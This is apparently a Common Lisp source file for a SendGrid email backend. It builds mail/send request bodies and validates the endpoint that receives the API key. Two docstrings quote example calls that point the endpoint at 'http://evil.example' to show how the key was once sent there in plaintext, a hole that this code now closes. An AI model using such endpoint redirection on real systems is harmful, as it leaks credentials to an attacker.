;;;; sendgrid.lisp --- the SendGrid (Twilio SendGrid) email backend.
;;;;
;;;; Maps a neutral EMAIL to the SendGrid v3 mail/send JSON and posts it with a Bearer key.
;;;; Success is 202 with an empty body and an X-Message-Id header (the id we return). All
;;;; SendGrid-specific shape lives here; the DELIVER protocol and the caller stay neutral. AWS
;;;; SES will be a sibling email-provider with the same method shape.

(cl:in-package #:hermes)

(defparameter +sendgrid-endpoint-default+ "https://api.sendgrid.com/v3/mail/send"
  "Where SendGrid's mail/send API lives. THE ONLY PLACE THIS URL IS WRITTEN in the tree, and not
only for tidiness: upstream.sexp tracks the SendGrid API version by reading what follows the API
host in this file, up to the NEXT SLASH (upstream.sexp:254), and every occurrence must agree.
Twilio's entry ends at the closing quote instead, because its version ends the string; this one
does not, and an earlier version of this docstring claimed it did. The same pin broke
twice for Twilio in #1077 -- once because a refusal message quoted the URL as an example, and
once because the docstring explaining that quoted the marker it was describing (#1092).")

(defclass sendgrid (email-provider)
  ((api-key :initarg :api-key
            :initform (uiop:getenv "SENDGRID_API_KEY")
            :reader sendgrid-api-key)
   (endpoint :initarg :endpoint
             :initform +sendgrid-endpoint-default+
             :reader sendgrid-endpoint)
   (connect-timeout :initarg :connect-timeout
                    :initform *send-connect-timeout*
                    :reader sendgrid-connect-timeout)
   (read-timeout :initarg :read-timeout
                 :initform *send-read-timeout*
                 :reader sendgrid-read-timeout))
  (:documentation "The SendGrid v3 mail/send API as an email-provider. API-KEY defaults to
$SENDGRID_API_KEY. CONNECT-TIMEOUT and READ-TIMEOUT are seconds and default from
*SEND-CONNECT-TIMEOUT* and *SEND-READ-TIMEOUT* (#1077). NIL FOR EITHER DOES NOT WAIT FOREVER:
AION/HTTP-CLIENT passes a timeout to dexador only when one is set, so NIL leaves dexador's own
default of ten seconds in force. There is no way from here to ask for an unlimited wait."))

(defmethod shared-initialize :after ((p sendgrid) slot-names &rest initargs &key &allow-other-keys)
  "Check the configured URL on EVERY initialization, not only the first.

SHARED-INITIALIZE AND NOT INITIALIZE-INSTANCE. The check used to hang off
INITIALIZE-INSTANCE :AFTER, which REINITIALIZE-INSTANCE does not call, so

  (reinitialize-instance (make-instance 'hermes::sendgrid ...) :endpoint \"http://evil.example/x\")

was accepted and the next send carried the credential there in plaintext. SHARED-INITIALIZE runs
for both, so there is no second door (the review of #1104)."
  (declare (ignore slot-names initargs))
  (%check-endpoint (sendgrid-endpoint p)))

(defun %check-endpoint (endpoint)
  "Signal CONFIGURATION-ERROR unless ENDPOINT is a URL a SendGrid request may carry the API key
to (#1092).

Every request carries the key as a Bearer credential in an Authorization header, so where the
request goes is where the key goes. Until #1092 this was not checked at all, so
(MAKE-SENDGRID :ENDPOINT \"http://evil.example/v3/mail/send\") sent the key in plaintext to
whatever host was named.

THE REFUSALS ARE %CHECK-CREDENTIAL-URL's, shared with Twilio rather than written again here. That
is the whole point of the issue: the locality half of this rule existed twice, in hermes core and
hermes/blob, and the two copies acquired three different holes between them. A third hand-written
copy would have been the same bet.

APPENDS-PATH IS NIL, because DELIVER sends this value as the request URL exactly as it stands --
unlike Twilio's API base, which has a path appended to it. So a query or a fragment is harmless
here and is not refused, and there is no second string to compare the approved host against."
  (%check-credential-url endpoint
                         :setting "SendGrid ENDPOINT"
                         :example +sendgrid-endpoint-default+
                         :credential "the API key"
                         :appends-path nil))

(defun make-sendgrid (&rest initargs &key api-key endpoint connect-timeout read-timeout)
  "A SendGrid provider. API-KEY defaults from $SENDGRID_API_KEY, and the two timeouts from
*SEND-CONNECT-TIMEOUT* and *SEND-READ-TIMEOUT* (#1077). ENDPOINT HAS NO ENVIRONMENT DEFAULT: it
is +SENDGRID-ENDPOINT-DEFAULT+ unless passed in code, which an earlier version of this docstring
got wrong. It is checked whenever it is set (#1092)."
  (declare (ignore api-key endpoint connect-timeout read-timeout))
  (apply #'make-instance 'sendgrid initargs))

(defun %obj (&rest kvs)
  "A jzon object (string-keyed hash-table) from KVS, a flat key/value plist."
  (let ((h (make-hash-table :test #'equal)))
    (loop for (k v) on kvs by #'cddr do (setf (gethash k h) v))
    h))

(defun %sendgrid-content (m)
  "The SendGrid content array: plain first (required), then html when present."
  (apply #'vector
         (%obj "type" "text/plain" "value" (email-text m))
         (when (email-html m)
           (list (%obj "type" "text/html" "value" (email-html m))))))

(defun %sendgrid-body (m)
  "The SendGrid v3 mail/send request body for the neutral email M."
  (let ((body (%obj "personalizations"
                    (vector (%obj "to" (vector (%obj "email" (email-to m)))))
                    "from" (%obj "email" (email-from m))
                    "subject" (email-subject m)
                    "content" (%sendgrid-content m))))
    (when (email-reply-to m)
      (setf (gethash "reply_to" body) (%obj "email" (email-reply-to m))))
    ;; Only when there are attachments, so an email without any is the same request as before
    ;; #366.
    (when (email-attachments m)
      (setf (gethash "attachments" body)
            (map 'vector #'%sendgrid-attachment (email-attachments m))))
    ;; SendGrid's top-level headers object applies to every personalization. Only when there
    ;; are headers, so an email without any is the same request as before #106.
    (when (email-headers m)
      ;; Checked again here, not only in MAKE-EMAIL: this is the one place the headers become a
      ;; request, and a struct made inside this package without MAKE-EMAIL would otherwise reach
      ;; the wire unchecked (the hub's review of #969).
      (%check-email-headers (email-headers m))
      (let ((headers (make-hash-table :test #'equal)))
        (loop for (name . value) in (email-headers m) do (setf (gethash name headers) value))
        (setf (gethash "headers" body) headers)))
    body))

(defun %sendgrid-attachment (a)
  "One entry of SendGrid's attachments array: the content in base64, and the type, filename and
disposition given; an inline attachment also carries its content_id."
  (let ((entry (%obj "content" (b64:usb8-array-to-base64-string (attachment-octets a))
                     "type" (attachment-content-type a)
                     "filename" (attachment-filename a)
                     "disposition" (string-downcase (symbol-name (attachment-disposition a))))))
    (when (attachment-content-id a)
      (setf (gethash "content_id" entry) (attachment-content-id a)))
    entry))

(defmethod deliver ((p sendgrid) (m email))
  (let* ((key (%require (sendgrid-api-key p) "SENDGRID_API_KEY"))
         (req (make-request :method :post
                            :url (sendgrid-endpoint p)
                            :content (jzon:stringify (%sendgrid-body m))
                            :connect-timeout (sendgrid-connect-timeout p)
                            :read-timeout (sendgrid-read-timeout p)))
         (resp (as-delivery :sendgrid
                 (send-request
                  req
                  (list (add-header "Authorization" (format nil "Bearer ~A" key))
                        (add-header "Content-Type" "application/json")
                        (ensure-2xx :sendgrid))))))
    (make-delivery-result
     :provider :sendgrid
     :id (header-value (response-headers resp) "x-message-id")
     :status :accepted
     :raw resp)))

(register-impl :email "sendgrid" (lambda () (make-sendgrid)))
